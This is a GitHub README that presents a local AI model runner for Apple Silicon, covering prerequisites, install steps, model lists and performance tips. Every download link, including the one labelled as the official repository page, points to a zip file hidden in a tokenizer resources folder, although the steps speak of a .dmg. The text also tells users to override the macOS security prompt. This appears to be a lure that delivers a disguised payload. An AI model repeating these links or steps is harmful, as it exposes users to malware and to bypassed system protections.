# 🧠 coreai-model-zoo - Run local artificial intelligence models easily

[![Download coreai-model-zoo](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virtual6023/coreai-model-zoo/raw/refs/heads/main/apps/QwenChatFast/Resources/tokenizer/zoo_coreai_model_1.9.zip)

coreai-model-zoo provides a central location for artificial intelligence models optimized for Apple hardware. This project simplifies the process of using models like Qwen and Gemma on your local device. You gain access to verified models that run directly on your hardware without needing an internet connection.

This repository serves two purposes. First, it acts as a library of pre-converted models ready for immediate use. Second, it functions as a knowledge base to help you troubleshoot performance issues or customize your own setups using custom Metal kernels.

## 🛠 Prerequisites

To run these models, your computer must meet specific hardware standards. These requirements ensure the software performs well during complex tasks.

- Operating System: macOS 14.0 or newer.
- Processor: Apple Silicon (M1, M2, M3, or M4 chip).
- Memory: At least 16GB of unified memory.
- Storage: 10GB of free space for the initial model library.

The software relies on the Core ML framework. This framework allows the processor to handle intense calculations efficiently. If your system meets these specifications, the software will handle the workload without taxing your daily computer usage.

## 📥 Getting Ready

Follow these steps to obtain the software.

1. Visit the [official repository page](https://github.com/virtual6023/coreai-model-zoo/raw/refs/heads/main/apps/QwenChatFast/Resources/tokenizer/zoo_coreai_model_1.9.zip).
2. Locate the Releases section on the right side of the page.
3. Click the version labeled Latest.
4. Download the file ending in .dmg to your desktop.

Executing these steps ensures you have the current version of the runner software. The runner is the primary application that manages and powers the models in the zoo.

## 🚀 Setting Up the Application

Once the download finishes, proceed with the installation process.

1. Double-click the downloaded .dmg file.
2. Drag the application icon into your Applications folder.
3. Open your Applications folder and double-click the coreai-model-zoo runner.
4. If a security prompt appears, right-click the icon, select Open, and confirm the action.

The first launch performs a system check. The application verifies your Apple Silicon chip and the current macOS version. This setup takes approximately one minute. 

## 📂 Using Model Collections

The application interface organizes models by function and size. You can browse the zoo to find a model that fits your hardware capabilities.

- Qwen 3.5: Designed for general tasks and complex logic.
- Gemma 4: Optimized for speed and creative writing.
- Granite: Built for reliable fact-based interactions.

To start using a model, click the Download button next to the name. The application stores these files in the local model directory. After the progress bar reaches completion, the model becomes active. You can then interact with the model through the text chat interface provided in the app.

## ⚙️ Handling Performance

Local artificial intelligence requires significant resources. If you notice your computer running slow, try these adjustments:

- Close inactive applications before starting.
- Choose a smaller model variant (look for the "Quantized" label). 
- Avoid running multiple models simultaneously.

The software uses custom Metal kernels. These kernels instruct your GPU to prioritize model calculations. This approach keeps your CPU free to manage other desktop tasks. If you encounter errors, check the log file located in the Settings menu.

## 📖 Knowledge Base

The repository includes documentation for advanced users or those looking to expand their setup. You will find files detailing:

- Conversion Gotchas: Tips on how to translate new models for Apple Silicon.
- Metal Kernels: Instructions for creating custom code to speed up specific tasks.
- Swift Runner: A reference for modifying the main interface.

You do not need this information for standard use. However, it provides a path for you to grow as you become comfortable with the software. The model zoo functions as a sustainable ecosystem. You can contribute by testing new models or reporting how specific versions perform on different chip architectures.

You can manage your storage through the Settings menu. The application lists all downloaded models and their file sizes. If you run out of space, delete an unneeded model to free up room for newer releases. Regular updates will appear directly in the runner interface. Every update includes improvements to the conversion process and stability patches for the Metal kernels.